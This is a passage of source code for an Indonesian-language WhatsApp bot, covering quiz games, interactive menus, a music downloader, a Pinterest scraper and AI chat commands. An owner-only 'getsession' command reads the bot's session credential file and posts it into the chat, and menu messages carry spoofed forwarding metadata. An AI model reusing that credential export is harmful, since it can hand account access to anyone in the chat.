            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyTan('*Anda Telah menyerah*')
delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await Tan.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyTan('*Anda Telah menyerah*')
delete tebakkimia[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await Tan.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
        
//=========================================\\
Tan.tekateki = Tan.tekateki ? Tan.tekateki : {}  
if(from in Tan.tekateki){
let users = global.db.users[m.sender]
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(Tan.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += Tan.tekateki[id][2]
 var teks = `*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${Tan.tekateki[id][2]} Money 💸`
 replyTan(`${teks}`)
 clearTimeout(Tan.tekateki[id][3])
 delete Tan.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyTan(`*Dikit Lagi!*`)
}
//=========================================\\

if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakasahotak[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await replyTan('*Anda Telah menyerah*')
delete tebakasahotak[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await Tan.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
//=========================================\\
        Tan.siapaaku = Tan.siapaaku ? Tan.siapaaku : {}
if(from in Tan.siapaaku){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(Tan.siapaaku[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += Tan.siapaaku[id][2]
var teks = `*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +${Tan.siapaaku[id][2]} Money 💸`
   replyTan(`${teks}`)
 clearTimeout(Tan.siapaaku[id][3])
 delete Tan.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyTan(`*Dikit Lagi!*`)
// else reply(`*Salah!*`) 
}
//=========================================\\
        Tan.susunkata = Tan.susunkata ? Tan.susunkata : {}  
if(from in Tan.susunkata){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
 let json = JSON.parse(JSON.stringify(Tan.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += Tan.susunkata[id][2]
   var teks = `*GAME SUSUN KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${Tan.susunkata[id][2]} Money 💸`
replyTan(`${teks}`)
 clearTimeout(Tan.susunkata[id][3])
 delete Tan.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyTan(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 
}
//=========================================\\
if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Tan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, { quoted: fcall }) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Tan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, { quoted: fcall }) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}

//=========================================//
Tan.tebaklirik = Tan.tebaklirik ? Tan.tebaklirik : {}  
if(from in Tan.tebaklirik){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(Tan.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.money += Tan.tebaklirik[id][2]
 global.db.users[m.sender].exp += 10
   var teks = `*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +${Tan.tebaklirik[id][2]} Money 💸\n EXP: +10`
  replyTan(`${teks}`)
 clearTimeout(Tan.tebaklirik[id][3])
 delete Tan.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) replyTan(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 }
//=========================================\\

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Tan.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, { quoted: fcall }) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}



//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
Tan.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, { quoted: fcall })
})
} catch (e) {
reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: Tan.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Tan.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
Tan.ev.emit('messages.upsert', msg)
}
 
switch (command) {
case 'play': {
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) return reply(`Example: ${prefix + command} nama lagu`);

    reply('Sedang memproses permintaan...');

    try {
        const axios = require('axios');
        const yts = require('yt-search');
        const searchResult = await yts.search(text);
        const video = searchResult.videos[0];
        if (!video) return reply('⚠️ Tidak ditemukan hasil untuk pencarian tersebut.');

        const videoUrl = video.url;
        const apiUrl = `https://api.paxsenix.biz.id/dl/ytmp3?url=${encodeURIComponent(videoUrl)}&format=mp3`;
        const firstResponse = await axios.get(apiUrl);
        const { ok, task_url } = firstResponse.data;

        if (!ok || !task_url) {
            return reply('⚠️ Gagal membuat tugas unduhan. Silakan coba lagi.');
        }
        let retries = 5;
        let delay = 2000;
        let taskResponse;
        while (retries > 0) {
            await new Promise((resolve) => setTimeout(resolve, delay));
            taskResponse = await axios.get(task_url);

            if (taskResponse.data.status === 'done') break;

            retries--;
        }

        if (!taskResponse || taskResponse.data.status !== 'done') {
            return reply('⚠️ Unduhan belum selesai diproses setelah beberapa percobaan. Silakan coba lagi nanti.');
        }
        const { info, url } = taskResponse.data;
        const { title, image } = info;
        await Tan.sendMessage(
            m.sender,
            {
                audio: { url: url },
                mimetype: 'audio/mpeg',
                contextInfo: {
                    externalAdReply: {
                        title: title || 'Judul tidak tersedia',
                        body: 'Musik berhasil diunduh',
                        thumbnailUrl: image,
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        sourceUrl: videoUrl,
                    },
                },
            },
            { quoted: m }
        );
        reply(`✅ Musik berhasil dikirim ke private chat: ${title}`);
    } catch (error) {
        console.error(error);
        reply(`⚠️ Terjadi kesalahan: ${error.message}`);
    }
}
break;
	case 'public': {
if (!isTanOwner) return reply(mess.only.owner)
Tan.public = true
replyTan('*Berhasil Mengubah Ke Penggunaan Publik*')
            }
            break
            case 'self': {
if (!isTanOwner) return reply(mess.only.owner)
Tan.public = false
replyTan('*Sukses Berubah Menjadi Pemakaian Sendiri*')
            }
            break

case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replyTan(`Usage: ${prefix + command} text1|text2`)
let { TelegraPh } = require('./lib/uploader')
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await Tan.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
memek = await Tan.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
} else {
replyTan(`Kirim/Balas Gambar Dengan Caption ${prefix + command} text1|text2`)
}
}
break
case 'listjadibot': 
try {
let user = [... new Set([...global.conns.filter(Tan => Tan.user).map(Tan => Tan.user)])]
te = "*Rentbot List*\n\n"
for (let i of user){
y = await Tan.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
Tan.sendMessage(from,{text:te,mentions: [y], },{ quoted: fcall })
} catch (err) {
replyTan(`Belum ada pengguna yang menyewa bot`)
}
break
case 'clearall': {
if (!isTanOwner) return reply(mess.only.owner)
Tan.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
              case 'pin':
              case 'pinterest': {
    let input = "Plis enter a title for gate img from pin! ";
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) return replyTan(input);
    await loading()
    const createImage = async (url) => {
        const { imageMessage } = await generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: Tan.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest(text);
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: []
        })
    })));
    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `${text}\n> Result`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, { quoted: fcall });

    await Tan.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'restart':
if (!isTanOwner) return reply(mess.only.owner)
replyTan(`restarting ${global.botname}`)
replyTan(`Done ✅`)
await sleep(3000)
process.exit()
break

case 'menu' : {
    let name = m.pushName || Tan.getName(m.sender);
if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
  await loading()
 let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      "messageContextInfo": {
        "deviceListMetadata": {},
        "deviceListMetadataVersion": 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Halo ${Tanwaktu} \`${name}\``,
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: ownername
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg'}}, { upload: Tan.waUploadToServer })), 
          title: '',
          subtitle: 'GOS',
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              "name": "single_select",
              "buttonParamsJson": `{
                "title": "PILIH MENU",
                "sections": [{
                  "title": "GOS",
                  "rows": [{
                    "title": "ALL MENU",
                    "description": "Lihat semua menu",
                    "id": "${prefix}allmenu"
                  },
                  {
                    "title": "DOWNLOADER",
                    "description": "Lihat main menu",
                    "id": "${prefix}downloadmenu"
                  },
                  {
                    "title": "GROUP",
                    "description": "Lihat main menu",
                    "id": "${prefix} groupmenu"
                  },
                  {
                    "title": "TOOLS",
                    "description": "Lihat main menu",
                    "id": "${prefix}toolsmenu"
                  },
                                    {
                    "title": "AI",
                    "description": "Lihat main menu",
                    "id": "${prefix}aimenu"
                  },
                  {
                    "title": "ANIME",
                    "description": "Lihat main menu",
                    "id": "${prefix}animemenu"
                  },
                  {
                    "title": "OWNER",
                    "description": "Lihat owner menu",
                    "id": "${prefix}ownermenu"
                  }]
                }]
              }`
            },
            {
              "name": "cta_url",
              "buttonParamsJson": `{\"display_text\":\"OWNER\",\"url\":\"https://api.whatsapp.com/send?phone=6285198468895\",\"merchant_url\":\"https://www.google.com\"}`
            },
            {
              "name": "cta_url",
              "buttonParamsJson": `{\"display_text\":\"DONATE\",\"url\":\"https://saweria.co/Supporttann\",\"merchant_url\":\"https://www.google.com\"}`
            }
          ],
        }),
        contextInfo: {
          mentionedJid: [m.sender], 
          forwardingScore: 100,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '12036332976784226@newsleter',
            newsletterName: wm,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m })

await Tan.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
}
break
case 'allmenu': {
let name = m.pushName || Tan.getName(m.sender);
if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
await loading()
let pan = `
*Halo ${Tanwaktu} \`${name}\`,*
`;
const url = fs.readFileSync("./data/image/thumb.jpg")
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: Tan.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Tan.waUploadToServer })),
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: global.toolsmenu()},
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"GITHUB☕","url":"https://github.com/Tanmyname-py","merchant_url":"https://github.com/Tanmyname-py"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Tan.waUploadToServer })),
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: global.ownermenu()},
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"YOUTUBE▶️","url":"https://www.youtube.com/@grzyzegt1429","merchant_url":"https://www.youtube.com/@grzyzegt1429"}`
                    },
                  ],
                },
              },
              {
              header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Tan.waUploadToServer })),
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: global.animemenu()},
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"TIKTOK🎶","url":"https://www.tiktok.com/@codenametan","merchant_url":"https://www.tiktok.com/@codenametan"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Tan.waUploadToServer })),
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: global.groupmenu()},
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"SALURAN📣","url":"https://whatsapp.com/channel/0029VahyeDI6BIEdqtqlXk1t","merchant_url":"https://whatsapp.com/channel/0029VahyeDI6BIEdqtqlXk1t"}`
                    },
                  ],
                },
              },
                             {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Tan.waUploadToServer })),
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: global.downloadmenu()},
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"OWNER🔥","url":"https://wa.me/${global.ownernumber}","merchant_url":"https://wa.me/${global.ownernumber}"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Tan.waUploadToServer })),
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text:
                  global.aimenu()
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"GROUP👀","url":"https://chat.whatsapp.com/IpJjOVS1IOz1On4w22pUZy","merchant_url":"https://chat.whatsapp.com/IpJjOVS1IOz1On4w22pUZy"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await Tan.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break
//List menu
case 'ownermenu' : {
reply(global.ownermenu())
break
 }
case 'groupmenu' : {
reply(global.groupmenu())
break
 }
case 'toolsmenu' : {
reply(global.toolsmenu())
break
 }
case 'downloadmenu' : {
reply(global.downloadmenu())
break
 }
case 'animemenu' : {
reply(global.animemenu())
break
 }
case 'aimenu' : {
reply(global.aimenu())
break
 }
case 'arisuai': {
    if (!text) {
        return reply(`Silakan masukkan pertanyaan atau perintah. Contoh: ${prefix + command} <pertanyaan Anda>`);
    }
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    try {
        let menuImage = './data/image/arisu.jpg'; 
        const { aris } = require('./lib/ai');
        const axios = require('axios');
        const  translate  = require('translate-google-api');
        const { arisuVoice } = require('./scrape/model');
        const delay = (ms) => new Promise((res) => setTimeout(res, ms));
        reply('Sedang memproses...');
        const aiResponse = await aris(text);
        const translatedText = await translate(aiResponse, { to: 'ja', tld: 'com' });
        console.log(`Respon AI (ID): ${aiResponse}`);
        console.log(`Respon AI (JP): ${translatedText}`);
    const audioResponse = await arisuVoice(translatedText);
      Tan.sendMessage(m.chat, {
      image: { url: menuImage },
      caption: aiResponse,
      mentions: [m.sender]
        });
        await Tan.sendMessage(m.chat, {
            audio: { url: audioResponse.result.url },
            mimetype: 'audio/mpeg',
            caption: `Arisu: ${aiResponse}`,
        });

    } catch (error) {
        console.error('Error:', error.message);
        reply(`⚠️ Terjadi kesalahan: ${error.message}`);
    }
    break;
}
case 'autoai' : {
    let name = m.pushName || Tan.getName(m.sender);
if (!isTanOwner) return reply(mess.only.owner)
if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
  await loading()
 let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      "messageContextInfo": {
        "deviceListMetadata": {},
        "deviceListMetadataVersion": 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Halo ${Tanwaktu} ${name} `,
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: ownername
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg'}}, { upload: Tan.waUploadToServer })), 
          title: '',
          subtitle: 'GOS',
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              "name": "single_select",
              "buttonParamsJson": `{
                "title": "ON/OF",
                "sections": [{
                  "title": "GOS",
                  "rows": [{
                    "title": "ON",
                    "description": "Aktifkan Autoai",
                    "id": "${prefix}autoai_on"
                  },
                  {
                    "title": "OF",
                    "description": "Matikan Autoai",
                    "id": "${prefix}autoai_off"
                  }]
                }]
              }`
            },
            {
              "name": "cta_url",
              "buttonParamsJson": `{\"display_text\":\"OWNER\",\"url\":\"https://api.whatsapp.com/send?phone=6285198468895\",\"merchant_url\":\"https://www.google.com\"}`
            },
            {
              "name": "cta_url",
              "buttonParamsJson": `{\"display_text\":\"DONATE\",\"url\":\"https://saweria.co/Supporttann\",\"merchant_url\":\"https://www.google.com\"}`
            }
          ],
        }),
        contextInfo: {
          mentionedJid: [m.sender], 
          forwardingScore: 100,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '12036332976784226@newsleter',
            newsletterName: wm,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m })

await Tan.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
}
break
case 'autotyping': {
    let name = m.pushName || Tan.getName(m.sender);
    if (!isTanOwner) return reply(mess.only.owner)
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    await loading();
    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `Halo ${Tanwaktu} ${name},\n\nAuto-Typing saat ini *${global.autoTyping ? 'AKTIF' : 'NONAKTIF'}*.\nPilih opsi di bawah untuk mengubah pengaturan.`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: ownername
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia(
                            { image: { url: './data/image/thumb.jpg' } },
                            { upload: Tan.waUploadToServer }
                        )),
                        title: '',
                        subtitle: 'GOS',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "single_select",
                                "buttonParamsJson": `{
                                    "title": "ON/OFF Auto-Typing",
                                    "sections": [{
                                        "title": "Pengaturan Auto-Typing",
                                        "rows": [{
                                            "title": "ON",
                                            "description": "Aktifkan Auto-Typing",
                                            "id": "${prefix}autotyping_on"
                                        },
                                        {
                                            "title": "OFF",
                                            "description": "Matikan Auto-Typing",
                                            "id": "${prefix}autotyping_off"
                                        }]
                                    }]
                                }`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 100,
                        isForwarded: true
                    }
                })
            }
        }
    }, { quoted: m });

    await Tan.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
    break;
}
case 'autotyping_on': {
    if (!isTanOwner) return reply(mess.only.owner)
    global.autoTyping = true;
    reply("✅ Auto-Typing telah *diaktifkan*.");
    break;
}
case 'autotyping_off': {
    if (!isTanOwner) return reply(mess.only.owner)
    global.autoTyping = false;
    reply("❌ Auto-Typing telah *dinonaktifkan*.");
    break;
}
case 'autoai_on': {
    if (!isTanOwner) return reply(mess.only.owner);
    if (autoAiData.enabledChats.includes(m.chat)) {
        return reply("Auto AI sudah aktif untuk chat ini.");
    }
    autoAiData.enabledChats.push(m.chat);
    saveAutoAiData();
    reply("Auto AI berhasil diaktifkan untuk chat ini.");
    break;
}
case 'autoai_off': {
    if (!isTanOwner) return reply(mess.only.owner);
    if (!autoAiData.enabledChats.includes(m.chat)) {
        return reply("Auto AI sudah nonaktif untuk chat ini.");
    }
    autoAiData.enabledChats = autoAiData.enabledChats.filter(chat => chat !== m.chat);
    saveAutoAiData();
    reply("Auto AI berhasil dinonaktifkan untuk chat ini.");
    break;
}
case 'claude': {
    if (!text) {
        return reply("Ada yang bisa saya bantu?");
    }
    try {
        const response = await claude(text);
        reply(response);
    } catch (error) {
        console.error("Error AI Gemini:", error);
        reply("⚠️ Maaf, terjadi kesalahan saat mengambil jawaban dari AI.");
    }
    break;
}
case 'gpt4omini': {
    if (!text) {
        return reply("Ada yang bisa saya bantu?");
    }
    try {
        const response = await gpt4omini(text);
        reply(response);
    } catch (error) {
        console.error("Error AI Gemini:", error);
        reply("⚠️ Maaf, terjadi kesalahan saat mengambil jawaban dari AI.");
    }
    break;
}
case 'gpt4o': {
    if (!text) {
        return reply("Ada yang bisa saya bantu?");
    }
    try {
        const response = await gpt4o(text);
        reply(response);
    } catch (error) {
        console.error("Error AI Gemini:", error);
        reply("⚠️ Maaf, terjadi kesalahan saat mengambil jawaban dari AI.");
    }
    break;
}

case 'gemini': {
    if (!text) {
        return reply("Ada yang bisa saya bantu?");
    }
    try {
        const response = await gemini(text);
        reply(response);
    } catch (error) {
        console.error("Error AI Gemini:", error);
        reply("⚠️ Maaf, terjadi kesalahan saat mengambil jawaban dari AI.");
    }
    break;
}
case 'llama3': {
    if (!text) {
        return reply("Ada yang bisa saya bantu?");
    }
    try {
        const response = await Llama3(text);
        reply(response);
    } catch (error) {
        console.error("Error AI Gemini:", error);
        reply("⚠️ Maaf, terjadi kesalahan saat mengambil jawaban dari AI.");
    }
    break;
}
case 'wizardlm': {
    if (!text) {
        return reply("Ada yang bisa saya bantu?");
    }
    try {
        const response = await wizardlm(text);
        reply(response);
    } catch (error) {
        console.error("Error AI Gemini:", error);
        reply("⚠️ Maaf, terjadi kesalahan saat mengambil jawaban dari AI.");
    }
    break;
}
case 'gemma': {
    if (!text) {
        return reply("Ada yang bisa saya bantu?");
    }
    try {
        const response = await gemma(text);
        reply(response);
    } catch (error) {
        console.error("Error AI Gemini:", error);
        reply("⚠️ Maaf, terjadi kesalahan saat mengambil jawaban dari AI.");
    }
    break;
}
case 'sc':
case 'script':
case 'donasi': {
  if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: Tan.waUploadToServer
    });
    return imageMessage;
  }
  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `> Hello ${pushname}`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Tan.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `The creator` },
                  nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"YouTube channel Tan","url":"https://www.youtube.com/@grzyzegt1429","merchant_url":"https://youtube.com/Tan"}`
                    },
                  ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: fkontak }
  );

  await Tan.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break
case 'getsession':
if (!isTanOwner) return reply(mess.only.owner)
replyTan('Wait a moment, currently retrieving your session file')
let sesi = await fs.readFileSync('./session/creds.json')
Tan.sendMessage(m.chat, {
document: sesi,
mimetype: 'application/json',
fileName: 'creds.json'
}, {
quoted: m
})
break
case 'q': case 'quoted': {
if (!m.quoted) return replyTan('Reply the Message!!')
let Tanwaw= await Tan.serializeM(await m.getQuotedObj())
if (!Tanwaw.quoted) return replyTan('Pesan yang Anda balas tidak dikirim oleh bot')
await Tanwaw.quoted.copyNForward(m.chat, true)
}
break
case 'wanumber': case 'nowa': case 'searchnumber':{
